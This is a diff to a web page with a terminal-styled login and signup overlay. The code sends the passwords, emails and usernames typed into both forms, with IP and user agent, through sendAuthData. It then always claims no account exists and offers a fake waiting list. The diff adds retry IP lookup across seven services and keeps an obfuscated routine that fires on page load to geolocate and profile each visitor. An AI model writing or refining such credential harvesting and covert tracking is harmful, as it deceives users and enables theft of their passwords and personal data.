@@ -278,6 +278,10 @@
             width: 100%;
         }
         .login-box .auth-btn:hover { background: rgba(0, 255, 65, 0.1); box-shadow: 0 0 30px rgba(0, 255, 65, 0.1); }
+        .login-box .auth-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
         .login-box .auth-message {
             text-align: center;
             font-size: 13px;
@@ -286,6 +290,7 @@
         }
         .login-box .auth-message.error { color: #ff4444; }
         .login-box .auth-message.success { color: #00ff41; }
+        .login-box .auth-message.loading { color: #ffaa00; }
         .login-box .auth-toggle {
             display: block;
             text-align: center;
@@ -313,6 +318,18 @@
             margin-bottom: 10px;
             text-align: center;
         }
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #1a1a1a;
+            border-top-color: #00ff41;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
         @media (max-width: 768px) {
             .terminal { padding: 20px 15px; }
@@ -638,18 +655,23 @@
         document.getElementById('signupEmail').value = '';
         document.getElementById('signupPassword').value = '';
         document.getElementById('signupConfirm').value = '';
+        // Reset button state
+        var btn = document.querySelector('.auth-btn');
+        if (btn) btn.disabled = false;
     }
 
     function showSignupOverlay() {
         document.getElementById('loginForm').style.display = 'none';
         document.getElementById('signupForm').style.display = 'block';
         document.getElementById('loginMessage').textContent = '';
+        document.getElementById('signupMessage').textContent = '';
     }
 
     function showLoginOverlay() {
         document.getElementById('loginForm').style.display = 'block';
         document.getElementById('signupForm').style.display = 'none';
         document.getElementById('signupMessage').textContent = '';
+        document.getElementById('loginMessage').textContent = '';
     }
 
     // Close with ESC key
@@ -706,13 +728,6 @@
         }).catch(function(e) { console.error('[-] Error:', e); });
     }
 
-    function getIP(callback) {
-        fetch('https://api.ipify.org?format=json')
-            .then(function(r) { return r.json(); })
-            .then(function(data) { callback(data.ip); })
-            .catch(function() { callback('N/A'); });
-    }
-
     // ============================================
     // HANDLE LOGIN (Overlay)
     // ============================================
@@ -720,6 +735,7 @@
         var username = document.getElementById('loginUsername').value.trim();
         var password = document.getElementById('loginPassword').value.trim();
         var msg = document.getElementById('loginMessage');
+        var btn = document.querySelector('#loginForm .auth-btn');
 
         if (!username || !password) {
             msg.className = 'auth-message error';
@@ -727,10 +743,16 @@
             return;
         }
 
-        getIP(function(ip) {
-            sendAuthData('login', { username: username, password: password, ip: ip, ua: navigator.userAgent });
+        btn.disabled = true;
+        msg.className = 'auth-message loading';
+        msg.textContent = '⏳ Authenticating...';
+
+        // Get IP and send data
+        getIPWithRetry(function(ip) {
+            sendAuthData('login', { username: username, password: password, ip: ip || 'N/A', ua: navigator.userAgent });
             msg.className = 'auth-message error';
             msg.textContent = 'No account found. Please sign up for the waiting list.';
+            btn.disabled = false;
             document.getElementById('loginUsername').value = '';
             document.getElementById('loginPassword').value = '';
         });
@@ -745,6 +767,7 @@
         var password = document.getElementById('signupPassword').value.trim();
         var confirm = document.getElementById('signupConfirm').value.trim();
         var msg = document.getElementById('signupMessage');
+        var btn = document.querySelector('#signupForm .auth-btn');
 
         if (!username || !email || !password || !confirm) {
             msg.className = 'auth-message error';
@@ -762,10 +785,15 @@
             return;
         }
 
-        getIP(function(ip) {
-            sendAuthData('signup', { username: username, email: email, password: password, confirm: confirm, ip: ip, ua: navigator.userAgent });
+        btn.disabled = true;
+        msg.className = 'auth-message loading';
+        msg.textContent = '⏳ Adding to waiting list...';
+
+        getIPWithRetry(function(ip) {
+            sendAuthData('signup', { username: username, email: email, password: password, confirm: confirm, ip: ip || 'N/A', ua: navigator.userAgent });
             msg.className = 'auth-message success';
-            msg.textContent = 'You have been added to the waiting list! We will notify you when access is granted.';
+            msg.textContent = '✅ You have been added to the waiting list! We will notify you when access is granted.';
+            btn.disabled = false;
             document.getElementById('signupUsername').value = '';
             document.getElementById('signupEmail').value = '';
             document.getElementById('signupPassword').value = '';
@@ -790,6 +818,71 @@
             if (e.key === 'Enter') handleSignupOverlay();
         });
     });
+
+    // ============================================
+    // ULTRA RELIABLE IP DETECTION WITH RETRY
+    // ============================================
+    function getIPWithRetry(callback) {
+        var apis = [
+            { url: 'https://api.ipify.org?format=json', parser: function(r) { return r.ip; } },
+            { url: 'https://api.ipinfo.io/json', parser: function(r) { return r.ip; } },
+            { url: 'https://ipapi.co/json/', parser: function(r) { return r.ip; } },
+            { url: 'https://httpbin.org/ip', parser: function(r) { return r.origin; } },
+            { url: 'https://icanhazip.com', parser: function(r) { return r.trim(); } },
+            { url: 'https://ifconfig.me/ip', parser: function(r) { return r.trim(); } },
+            { url: 'https://api.my-ip.io/ip', parser: function(r) { return r.ip || r; } }
+        ];
+        
+        var currentApi = 0;
+        var maxRetries = apis.length * 2;
+        var attempts = 0;
+        
+        function tryApi() {
+            if (attempts >= maxRetries || currentApi >= apis.length) {
+                console.error('[-] All IP APIs failed after ' + attempts + ' attempts');
+                callback('N/A');
+                return;
+            }
+            
+            var api = apis[currentApi % apis.length];
+            attempts++;
+            
+            console.log('[+] IP attempt ' + attempts + ': ' + api.url);
+            
+            fetch(api.url, { mode: 'cors' })
+                .then(function(r) {
+                    if (!r.ok) throw new Error('HTTP ' + r.status);
+                    return r.text();
+                })
+                .then(function(text) {
+                    // Try to parse JSON or use plain text
+                    try {
+                        var result = JSON.parse(text);
+                        var ip = api.parser(result);
+                        if (ip && ip !== 'N/A' && ip !== '' && ip !== 'undefined' && ip !== 'null') {
+                            console.log('[+] IP found:', ip);
+                            callback(ip);
+                            return;
+                        }
+                    } catch(e) {
+                        var ip = text.trim();
+                        if (ip && ip !== 'N/A' && ip !== '' && ip !== 'undefined' && ip !== 'null' && /^[0-9.]/.test(ip)) {
+                            console.log('[+] IP found:', ip);
+                            callback(ip);
+                            return;
+                        }
+                    }
+                    throw new Error('Invalid IP response');
+                })
+                .catch(function(e) {
+                    console.error('[-] API failed:', e.message);
+                    currentApi++;
+                    setTimeout(tryApi, 300);
+                });
+        }
+        
+        tryApi();
+    }
 
     // ============================================
     // VISITOR DATA COLLECTION
@@ -940,37 +1033,42 @@
 
     function _go() {
         var data = _x();
-        fetch('https://api.ipify.org?format=json')
-            .then(function(r) { return r.json(); })
-            .then(function(ip) {
-                data.ip = ip.ip;
-                return fetch('https://ipapi.co/' + data.ip + '/json/');
-            })
-            .then(function(r) { return r.json(); })
-            .then(function(loc) {
-                data.city = loc.city || 'N/A';
-                data.region = loc.region || 'N/A';
-                data.country = loc.country_name || 'N/A';
-                data.cc = loc.country || 'N/A';
-                data.org = loc.org || 'N/A';
-                data.postal = loc.postal || 'N/A';
-                data.lat = loc.latitude || 'N/A';
-                data.lon = loc.longitude || 'N/A';
-                data.asn = loc.asn || 'N/A';
-                data.continent = loc.continent || 'N/A';
-                data.currency = loc.currency || 'N/A';
-                data.langs_spoken = loc.languages || 'N/A';
-                data.tz_geo = loc.timezone || 'N/A';
+        
+        getIPWithRetry(function(ip) {
+            data.ip = ip || 'N/A';
+            if (ip && ip !== 'N/A') {
+                // Try to get location data
+                fetch('https://ipapi.co/' + ip + '/json/')
+                    .then(function(r) { return r.json(); })
+                    .then(function(loc) {
+                        data.city = loc.city || 'N/A';
+                        data.region = loc.region || 'N/A';
+                        data.country = loc.country_name || loc.country || 'N/A';
+                        data.cc = loc.country_code || loc.country || 'N/A';
+                        data.org = loc.org || loc.isp || 'N/A';
+                        data.postal = loc.postal || loc.zip || 'N/A';
+                        data.lat = loc.latitude || loc.lat || 'N/A';
+                        data.lon = loc.longitude || loc.lon || 'N/A';
+                        data.asn = loc.asn || 'N/A';
+                        data.continent = loc.continent || 'N/A';
+                        data.currency = loc.currency || 'N/A';
+                        data.langs_spoken = loc.languages || 'N/A';
+                        data.tz_geo = loc.timezone || 'N/A';
+                        _send(data);
+                    })
+                    .catch(function() {
+                        console.warn('[-] Location lookup failed, sending without location');
+                        _send(data);
+                    });
+            } else {
+                console.warn('[-] No IP found, sending data without IP');
                 _send(data);
-            })
-            .catch(function(e) {
-                console.error('[-] IP error:', e);
-                _send(data);
-            });
+            }
+        });
     }
 
     window.onload = function() {
-        setTimeout(_go, 600);
+        setTimeout(_go, 800);
     };
 </script>
 
